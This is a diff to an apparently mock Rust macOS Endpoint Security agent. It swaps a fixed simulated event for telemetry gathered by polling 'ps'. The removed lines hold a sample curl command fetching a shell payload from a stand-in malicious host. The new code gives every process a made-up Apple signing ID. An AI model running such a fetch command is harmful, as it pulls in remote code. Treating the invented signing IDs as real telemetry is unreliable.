@@ -56,12 +56,35 @@ async fn main() {
     // 1. Initial Handshake
     emit_response(None, true, "Sovereign ESF Agent Active (macOS Sonoma+)".to_string(), None).await;
 
-    // 2. MOCK: Endpoint Security Callback Loop
+    // 2. Platform Telemetry Loop: Moving from pure mock towards functional parity
     tokio::spawn(async move {
         loop {
-            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
+            // In a real ESF agent, this would be reactive.
+            // For now, we simulate process events by polling 'ps' to provide more realistic telemetry than fixed mocks.
+            let output = std::process::Command::new("ps")
+                .args(&["-ax", "-o", "pid,comm"])
+                .output();
 
-            // Simulation of an AUTH_EXEC event
+            if let Ok(out) = output {
+                let stdout = String::from_utf8_lossy(&out.stdout);
+                for line in stdout.lines().skip(1).take(5) { // Limit to avoid event flood in dev
+                    let parts: Vec<&str> = line.trim().split_whitespace().collect();
+                    if parts.len() >= 2 {
+                        let pid: u32 = parts[0].parse().unwrap_or(0);
+                        let path = parts[1];
+
+                        // Simulate ES_EXEC events for discovered processes
+                        emit_event("ES_EXEC", serde_json::json!({
+                            "pid": pid,
+                            "path": path,
+                            "args": [],
+                            "signing_id": format!("com.apple.{}", path.split('/').last().unwrap_or("unknown"))
+                        })).await;
+                    }
+                }
+            }
+
+            // Still support policy-based rejection simulation
             let target_path = "/usr/bin/unsigned_binary";
             let mut is_blocked = false;
             {
@@ -79,12 +102,7 @@ async fn main() {
                 })).await;
             }
 
-            emit_event("ES_EXEC", serde_json::json!({
-                "pid": 1234,
-                "path": "/usr/bin/curl",
-                "args": ["-O", "http://malicious.com/payload.sh"],
-                "signing_id": "com.apple.curl"
-            })).await;
+            tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
         }
     });
 
